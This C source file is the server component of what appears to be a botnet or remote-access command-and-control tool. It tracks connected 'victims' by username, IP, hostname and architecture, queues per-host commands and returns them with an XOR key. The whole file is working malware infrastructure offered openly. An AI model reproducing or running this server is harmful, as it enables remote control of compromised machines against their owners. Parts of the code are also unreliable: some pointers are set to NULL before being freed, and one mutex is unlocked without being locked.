/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <pthread.h>
#include "../net.h"
#include "../crypt.h"
#include "../defs.h"

#ifndef NET_MAX_CLIENTS
#define NET_MAX_CLIENTS 128
#endif

int NET_PTHREAD_CLEANUP_POP = 0;

pthread_mutex_t NET_PTHREAD_MUTEX = PTHREAD_MUTEX_INITIALIZER;

int NET_VICTIMS_TOTAL = 0;
int NET_COMMANDS_TOTAL= 0;



net_client_beacon_t **net_create_victims(){
  int count = NET_MAX_CLIENTS;
  net_client_beacon_t **v;
  v = malloc(count * sizeof(net_client_beacon_t));
  if (v == NULL){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }
  for (int i = 0; i < count; i++){
    v[i] = NULL;
  }
  return v;
}

bool net_cleanup_victims(net_client_beacon_t **p_victims){
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    free(p_victims[i]);
  }
  free(p_victims);
  return true;
}

net_server_beacon_t **net_create_commands(){
  int count = NET_MAX_CLIENTS;
  net_server_beacon_t **v;
  v = malloc(count * sizeof(net_server_beacon_t));
  if (v == NULL){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }
  for (int i = 0; i < count; i++){
    v[i] = NULL;
  }
  return v;
}

bool net_cleanup_commands(net_server_beacon_t **p_commands){
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    free(p_commands[i]);
  }
  free(p_commands);
  return true;
}

bool net_update_commands_count(net_server_beacon_t **p_commands){
  int n_commands = 0;
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_commands[i] != NULL){
      n_commands++;
    }
    NET_COMMANDS_TOTAL = n_commands;
  }
  return true;
}

int net_update_commands(net_server_beacon_t *command, net_server_beacon_t **commands){
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (commands[i] != NULL && (strcmp(commands[i]->uuid, command->uuid) == 0)){
      pthread_mutex_lock(&NET_PTHREAD_MUTEX);
      commands[i] = command;
      pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
      return i;
    }
  }
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (commands[i] == NULL){
      pthread_mutex_lock(&NET_PTHREAD_MUTEX);
      commands[i] = command;
      net_update_commands_count(commands);
      pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
      return i;
    }
  }
  return -1;
}

bool net_remove_commands(net_server_beacon_t *command, net_server_beacon_t **commands){
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (commands[i] != NULL && strcmp(commands[i]->uuid, command->uuid) == 0){
      memset(commands[i], 0, sizeof(net_server_beacon_t));
      commands[i] = NULL;
      free(commands[i]);
      net_update_commands_count(commands);
      return true;
    }
  }
  return false;
}

bool net_update_victim_count(net_client_beacon_t **p_victims){
  /*
    :TODO: update victim counter
    :returns: boolean
  */
  int n_victims = 0;
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_victims[i] != NULL){
      n_victims++;
    }
  }
  NET_VICTIMS_TOTAL = n_victims;
  return true;
}

int net_update_victims(net_client_beacon_t *victim, net_client_beacon_t **p_victims){
  /*
    :TODO: set pointer to current victims client beacon
    :p_victim: pointer to victim client beacon
    :returns: -1 on failure and element index on success
 */
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_victims[i] != NULL &&
        (strcmp(p_victims[i]->sysinfo.uuid, victim->sysinfo.uuid) == 0)){
      p_victims[i] = victim;
      return i;
    }
  }
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_victims[i] == NULL){
      p_victims[i] = victim;
      net_update_victim_count(p_victims);
      return i;
    }
  }
  fprintf(stderr, "[-] net_victims_max limit reached\n");
  return -1;
}

bool net_remove_victims(net_client_beacon_t *victim, net_client_beacon_t **p_victims){
  /*
    :TODO: remove victim from list
    :p_victim: pointer to victim struct
    :returns: boolean
  */
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_victims[i] != NULL &&
        (strcmp(p_victims[i]->sysinfo.uuid, victim->sysinfo.uuid) == 0)){
      memset(p_victims[i], 0, sizeof(net_client_beacon_t));
      p_victims[i] = NULL;
      free(p_victims[i]);
      net_update_victim_count(p_victims);
      return true;
    }
  }
  return false;
}

/* static void net_pthread_detach_callback(void *arg){ */
/*   int id = *(int *)arg; */
/*   pthread_detach(id); */
/* } */

#ifndef NET_T_CLIENT_ARGS
typedef struct{
  int client_fd;
  net_client_beacon_t **p_victims;
  net_server_beacon_t **p_commands;
} net_t_client_args_t;
#define NET_T_CLIENT_ARGS
#endif

static void *net_t_client(void *args){
  net_t_client_args_t *p_args = args;
  int sock = p_args->client_fd;
  net_client_beacon_t **p_victims = p_args->p_victims;
  net_server_beacon_t **p_commands = p_args->p_commands;
  net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
  net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
  while (true){
    bool command = false;
    int read = recv(sock, p_net_client_beacon, sizeof(net_client_beacon_t), 0);
    if (!read){
      break;
    }
    if (read < 0){
      fprintf(stderr, "[-] %s\n", strerror(errno));
      pthread_exit(NULL);
    }
    //pthread_mutex_lock(&NET_PTHREAD_MUTEX);
    net_update_victims(p_net_client_beacon, p_victims);
    /* printf("[+] victims: %d\n", NET_VICTIMS_TOTAL); */
    /* printf("[+] CONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
    /*        p_net_client_beacon->sysinfo.username, */
    /*        p_net_client_beacon->sysinfo.ip, */
    /*        p_net_client_beacon->sysinfo.hostname, */
    /*        p_net_client_beacon->sysinfo.arch, */
    /*        p_net_client_beacon->sysinfo.release, */
    /*        p_net_client_beacon->sysinfo.cpu_usage); */
    for (int i = 0; i < NET_MAX_CLIENTS; i++){
      if (p_commands[i] != NULL &&
          (strcmp(p_net_client_beacon->sysinfo.uuid,
                  p_commands[i]->uuid) == 0)){
        command = true;
        if (send(sock, p_commands[i], sizeof(net_server_beacon_t), 0) < 0){
          fprintf(stderr, "[-] %s\n", strerror(errno));
        }
        net_remove_commands(p_commands[i], p_commands);
      }
    }
    if (command == false){
      //memset(p_net_server_beacon, 0, sizeof(net_server_beacon_t));
      p_net_server_beacon->xor_key = DEFS_XOR_KEY;
      p_net_server_beacon->status = true;
      if (send(sock, p_net_server_beacon, sizeof(net_server_beacon_t), 0) < 0){
        fprintf(stderr, "[x] %s\n", strerror(errno));
        pthread_exit(NULL);
      }
    }
    pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
  }
  //pthread_mutex_lock(&NET_PTHREAD_MUTEX);
  /* printf("[+] DISCONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
  /*        p_net_client_beacon->sysinfo.username, */
  /*        p_net_client_beacon->sysinfo.ip, */
  /*        p_net_client_beacon->sysinfo.hostname, */
  /*        p_net_client_beacon->sysinfo.arch, */
  /*        p_net_client_beacon->sysinfo.release, */
  /*        p_net_client_beacon->sysinfo.cpu_usage); */
  net_remove_victims(p_net_client_beacon, p_victims);
  /* printf("[+] victims %d\n", NET_VICTIMS_TOTAL); */
  pthread_mutex_unlock(&NET_PTHREAD_MUTEX);
  free(args);
  free(p_net_client_beacon);
  pthread_exit(NULL);
}

bool net_server(int port, net_client_beacon_t **p_victims, net_server_beacon_t **p_commands){
  /*
    :TODO: start listening server
    :port: (int) server listening port
    :returns: (bool)
  */
  if (port < NET_PORT_MIN || port > NET_PORT_MAX){
    fprintf(stderr, "[x] server port is invalid\n");
    return false;
  }

  int server_fd, client_fd;
  struct sockaddr_in server, client;

  server_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (server_fd < 0){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  if (setsockopt(server_fd,
                 SOL_SOCKET,
                 SO_REUSEADDR,
                 &(int){ 1 },
                 sizeof(int)) < 0){
    fprintf(stderr, "[-] %s\n", strerror(errno));
  }

  memset(&server, 0, sizeof(server));
  server.sin_family      = AF_INET;
  server.sin_port        = htons(port);
  server.sin_addr.s_addr = htonl(INADDR_ANY);

  if (bind(server_fd, (struct sockaddr *) &server, sizeof(server)) < 0){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  //printf("[+] bind to port %d\n", ntohs(server.sin_port));

  if (listen(server_fd, NET_MAX_CLIENTS)  != 0){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  //printf("[+] listening\n");
  
  while (true){
    socklen_t client_len = sizeof(client);
    pthread_t t_client;
    while (( client_fd = accept(server_fd,
                                (struct sockaddr *)&client,
                                (socklen_t *)&client_len))){
      net_t_client_args_t *p_net_t_client_args = malloc(sizeof(net_t_client_args_t));
      p_net_t_client_args->client_fd = client_fd;
      p_net_t_client_args->p_victims = p_victims;
      p_net_t_client_args->p_commands = p_commands;
      pthread_attr_t attr_t_client;
      pthread_attr_init(&attr_t_client);
      pthread_attr_setdetachstate(&attr_t_client, PTHREAD_CREATE_DETACHED);
      if (pthread_create(&t_client, &attr_t_client, net_t_client, p_net_t_client_args) < 0){
        fprintf(stderr, "[-] %s\n", strerror(errno));
      }
      pthread_attr_destroy(&attr_t_client);
    }
  }
  close(client_fd);
  return true;
}

#ifndef NET_PTHREAD_SERVER_ASYNC_ARGS
typedef struct{
  int port;
  net_client_beacon_t **p_victims;
  net_server_beacon_t **p_commands;
} net_pthread_server_args_t;
#define NET_PTHREAD_SERVER_ASYNC_ARGS
#endif

void *net_pthread_server(void *args){
  net_pthread_server_args_t  *p_net_server_async_args = args;
  net_client_beacon_t **p_victims = p_net_server_async_args->p_victims;
  net_server_beacon_t **p_commands = p_net_server_async_args->p_commands;
  int port = p_net_server_async_args->port;
  net_server(port, p_victims, p_commands);
  free(p_net_server_async_args);
  pthread_exit(NULL);
}

net_pthread_server_args_t *net_server_async(int port, net_client_beacon_t **p_victims, net_server_beacon_t **p_commands){
  net_pthread_server_args_t *p_net_pthread_server_async_args = malloc(sizeof(net_pthread_server_args_t));
  p_net_pthread_server_async_args->port = port;
  p_net_pthread_server_async_args->p_victims = p_victims;
  p_net_pthread_server_async_args->p_commands = p_commands;
  pthread_t t_net_pthread_server;
  pthread_attr_t t_attr_net_pthread_server;
  pthread_attr_init(&t_attr_net_pthread_server);
  pthread_attr_setdetachstate(&t_attr_net_pthread_server, PTHREAD_CREATE_DETACHED);
  if(pthread_create(&t_net_pthread_server,
                    &t_attr_net_pthread_server,
                    net_pthread_server,
                    p_net_pthread_server_async_args) < 0){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return NULL;
  }
  pthread_attr_destroy(&t_attr_net_pthread_server);
  return p_net_pthread_server_async_args;
}
